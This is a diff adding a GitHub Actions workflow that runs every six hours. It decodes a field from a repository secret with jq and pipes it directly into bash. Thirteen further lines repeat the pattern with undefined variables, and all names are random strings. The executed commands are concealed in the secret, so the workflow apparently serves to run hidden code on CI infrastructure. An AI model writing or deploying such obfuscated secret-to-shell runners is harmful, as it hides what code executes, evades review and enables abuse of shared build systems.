@@ -1,0 +1,30 @@
+name: laoliuzileng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoliuzileng
+        env:
+          xnaae7286: ${{ secrets.xnaae7286 }}
+        run: |
+          echo $xnaae7286 | jq -r .vcxn69073 | /bin/bash
+          echo $v7804 | jq -r .azckj718 | /bin/bash
+          echo $i9 | jq -r .htjfu269 | /bin/bash
+          echo $mounz30 | jq -r .oj6 | /bin/bash
+          echo $h5 | jq -r .vhw9704 | /bin/bash
+          echo $l7 | jq -r .zuar46786 | /bin/bash
+          echo $cljp72582 | jq -r .c051 | /bin/bash
+          echo $ugu143 | jq -r .bsnb7 | /bin/bash
+          echo $u9 | jq -r .ewp57 | /bin/bash
+          echo $jsl8 | jq -r .tdwx1491 | /bin/bash
+          echo $eq011 | jq -r .qyq81396 | /bin/bash
+          echo $phfp86635 | jq -r .irus27829 | /bin/bash
+          echo $ugqzf7 | jq -r .lston73 | /bin/bash
+          echo $nltxm9 | jq -r .gsla21189 | /bin/bash
+
